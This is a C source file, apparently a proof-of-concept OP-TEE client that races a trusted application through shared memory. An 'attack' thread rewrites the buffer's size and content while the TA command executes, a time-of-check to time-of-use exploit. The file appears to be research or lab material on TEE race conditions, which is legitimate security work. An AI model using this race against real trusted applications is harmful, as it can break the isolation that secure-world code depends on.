#include <err.h>
#include <stdio.h>
#include <string.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>
#include <pthread.h>
#include <unistd.h>
/* To the the UUID (found the the TA's h-file(s)) */
#include <toctou.h>

struct command {
	int size;
	char content[256];
};

void *attack(void *in){
	printf("====Change shard memory====\n");
	TEEC_SharedMemory *p = (TEEC_SharedMemory*)in;
	struct command *payload = (struct command *)p->buffer;
	sleep(0.001);
	printf("Prev content:%s\n",payload->content);
	printf("After size:%d\n",payload->size);
	payload->size = 64;
	strncpy(payload->content,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",payload->size);
	printf("After content:%s\n",payload->content);
	printf("After size:%d\n",payload->size);

	printf("====Change shard memory finish====\n");
	return 0;
};

int main(void)
{
	TEEC_Result res;
	TEEC_Context ctx;
	TEEC_Session sess;
	TEEC_Operation op;
	TEEC_UUID uuid = TA_TOCTOU_UUID;
	TEEC_SharedMemory in_mem;
	uint32_t err_origin;
	struct command payload;

	res = TEEC_InitializeContext(NULL, &ctx);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

	res = TEEC_OpenSession(&ctx, &sess, &uuid,
			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
			res, err_origin);
	memset(&op, 0, sizeof(op));

	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_NONE,
					 TEEC_NONE, TEEC_NONE);

	memcpy(payload.content, "zzzzzzzz", 8);
	payload.size = 8;
    in_mem.buffer = &payload;
    in_mem.size = 64;
    in_mem.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;
	op.params[0].memref.parent = &in_mem;
	// printf("sizeof payload:%d\n",sizeof(payload));

	// printf("size:%d\n",in_mem.size);

	res = TEEC_RegisterSharedMemory(&ctx,&in_mem);
	if (res != TEEC_SUCCESS){
		printf("!!Error register memory");
	}
	pthread_t thr2;
	pthread_create(&thr2, NULL, attack, &in_mem);

	res = TEEC_InvokeCommand(&sess, TA_TOCTOU_CMD_CREATE_MEMORY, &op, NULL);
    if (res != TEEC_SUCCESS) {
      printf("TEEC_InvokeCommand fail with 0x%x\n", res);
      TEEC_CloseSession(&sess);
      TEEC_FinalizeContext(&ctx);
      return 0;
    }


	TEEC_CloseSession(&sess);

	TEEC_FinalizeContext(&ctx);

	return 0;
}
